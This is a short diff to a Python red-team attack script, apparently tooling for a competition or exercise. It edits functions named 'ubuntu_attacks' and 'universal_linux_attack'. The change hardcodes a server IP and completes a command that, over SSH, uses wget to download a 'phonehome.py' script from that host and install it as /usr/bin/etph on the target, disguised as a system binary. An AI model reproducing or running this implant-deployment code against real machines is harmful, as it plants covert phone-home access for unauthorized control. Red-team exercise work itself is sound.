@@ -220,6 +220,8 @@ def universal_linux_attack(host):
 def ubuntu_attacks(host):
     # Replace upstream DNS with red team villainy
     # sudo update-rc.d bind disable
+    
+    server_ip = "10.0.0.101"
     ssh = pxssh.pxssh()
 
     try:
@@ -236,7 +238,7 @@ def ubuntu_attacks(host):
     log_line(ssh.before.decode('utf8'), host)
 
      # ez mode /etc/group
-    wget_phonehome_cmd = "wget {}/phonehome.py -O /usr/bin/etph" 
+    wget_phonehome_cmd = "wget {}/phonehome.py -O /usr/bin/etph".format(server_ip)
     log_line("Downloading phone home script on {}".format(host.ip), host, print_flag=True)
     ssh.sendline(wget_phonehome_cmd)
     ssh.prompt()
